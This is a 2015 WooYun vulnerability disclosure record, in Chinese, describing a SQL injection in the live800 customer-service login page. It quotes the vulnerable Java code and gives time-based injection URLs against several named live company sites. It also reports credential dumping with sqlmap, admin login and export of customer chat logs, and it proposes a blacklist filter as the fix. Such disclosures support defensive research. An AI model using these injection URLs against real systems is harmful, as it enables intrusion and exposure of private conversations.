{"id": 72810, "wybug_id": "wooyun-2015-0147511", "wybug_title": "live800在线客服系统SQL注射漏洞", "wybug_corp": "live800.com", "wybug_author": "applychen", "wybug_date": "2015-10-18 09:51", "wybug_open_date": "2016-01-21 10:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-23：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向公众公开  简要描述： SQL注射漏洞，可看客户与客服对话内容，泄露大量敏感信息。 详细说明：  通过此漏洞 WooYun: live800客服系统任意文件下载漏洞 下载站点源码，在loginAction.jsp中发现以下内容：\nString loginName=request.getParameter(\"loginName\");\tString password=request.getParameter(\"password\");\tString loginServerUrl = request.getParameter(\"loginServerUrl\");    OperatorInfo operatorInfo=new OperatorInfo();    operatorInfo.setLoginName(loginName);    password = URLUtil.unEscapeHtml(password);    operatorInfo.setPassword(password);    operatorInfo.setLoginServerUrl(loginServerUrl);\tint result=DBManager.validateLogin(request.getParameter(\"companyLoginName\"),operatorInfo);//跟踪此方法\tif(DBError.NO_EXCEPTION==result&&operatorInfo.validateLogin()&&!StringUtils.isNullOrLengthZero(operatorInfo.getId()))\n跟踪用于登录的DBManager.validateLogin()方法，代码做了混淆看着有点吃力：\npublic static int validateLogin(String paramString, OperatorInfo paramOperatorInfo)  {    if (paramOperatorInfo == null) {      return 17;    }    String str1 = paramOperatorInfo.getPassword();    if (StringUtils.isNullOrLengthZero(new String[] { str1,       paramString })) {      return 17;    }    paramOperatorInfo.setPassword(Password.getEncodingPassword(str1));    String str2 =       ak.i(paramString);//跟踪此方法    if (StringUtils.isNullOrLengthZero(str2)) {      return 17;    }    paramOperatorInfo.setCompanyId(str2);    return OperatorDBM.validateLogin(paramOperatorInfo);  }\n再跟踪 ak.i()方法：\npublic static String i(String paramString)  {    StringBuffer localStringBuffer = new StringBuffer();    localStringBuffer      .append(\"select company_id from company where company_login_name='\");    localStringBuffer.append(paramString);    localStringBuffer.append(\"' and user_type!='\");    localStringBuffer.append(\"U\");    localStringBuffer.append(\"'\");    return DBCommuter.getAnAttribute(localStringBuffer.toString());  }\n在这里看到SQL语句是由参数拼接而成的，最后跟踪DBCommuter.getAnAttribute(localStringBuffer.toString())看看SQL是怎么执行的：\npublic static final String getAnAttribute(String paramString) {    if (paramString == null) {      return null;    }    String str = null;    Connection localConnection = null;    Statement localStatement = null;    ResultSet localResultSet = null;    if (Live800Define.isOracle)      paramString = MysqlToOracle.dividePage(paramString);    try    {      localConnection = a();      localStatement = localConnection.createStatement();      localResultSet = localStatement.executeQuery(paramString);      if (localResultSet.next()) {        str = localResultSet.getString(1);      }      a(localStatement.getWarnings(), paramString);      a(localResultSet.getWarnings(), paramString);      localResultSet.close();      localResultSet = null;      localStatement.close();      localStatement = null;      localConnection.close();      localConnection = null;    } catch (SQLException localSQLException1) {      localSQLException1.printStackTrace();      if (a.isWarnEnabled()) {        a.logWarn(paramString, localSQLException1);      }    }    finally    {      if (localResultSet != null) {        try {          localResultSet.close();        } catch (SQLException localSQLException2) {          a.logFatal(\"close rs error!\", localSQLException2);        }        localResultSet = null;      }      if (localStatement != null) {        try {          localStatement.close();        } catch (SQLException localSQLException3) {          a.logFatal(\"close stmt error!\", localSQLException3);        }        localStatement = null;      }      if (localConnection != null) {        try {          localConnection.close();        } catch (SQLException localSQLException4) {          a.logFatal(\"close connect error!\", localSQLException4);        }        localConnection = null;      }    }    return str;  }\n从以上的代码不难看出程序未进行参数化查询导致SQL注入漏洞发生。还是以华为作为测试用例，访问以下地址登录：\nhttp://robotim.vmall.com/live800/login.jsp?aaa=1\n抓取数据包：\n\n其中的companyLoginName存在SQL注入：\nhttp://robotim.vmall.com/live800/loginAction.jsp?companyLoginName=1%27or(select%20sleep(2))%23&loginName=a111&password=111\n可以看到页面成功延迟2s，用SQLMAP跑出账户密码：\n\n成功登录后台：\n\n在后台有个对话记录查询功能：\n\n直接导出详细记录即可查看对话记录：\n\n简单例几个受此漏洞影响的站点：\nhttp://800.vip.com/live800/loginAction.jsp?companyLoginName=test%27or(select sleep(3))%23&loginName=test2&password=test3http://livechat1.eachnet.com/live800/loginAction.jsp?companyLoginName=-1%27union%20select%20(select%20sleep(3))%20from%20company%20limit%201%23&loginName=test2&password=test3http://fnonline.feiniu.com/live800/loginAction.jsp?companyLoginName=-1%27union%20select%20(select%20sleep(3))%20from%20company%20limit%201%23&loginName=test2&password=test3http://sf-ocs.sf-express.com:8080/live800/loginAction.jsp?companyLoginName=-1%27union%20select%20(select%20sleep(3))%20from%20company%20limit%201%23&loginName=test2&password=test3http://online.kingdee.com/live800/loginAction.jsp?companyLoginName=-1%27union%20select%20(select%20sleep(3))%20from%20company%20limit%201%23&loginName=test2&password=test3\n   漏洞证明：  同上   修复方案：  做一个filter全局过滤SQL注入危险字符   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-21 10:00 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 2015-10-23：感谢applychen及时反馈，我们已经通知相关人员进行文件删除。同时进行其他请求排除  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}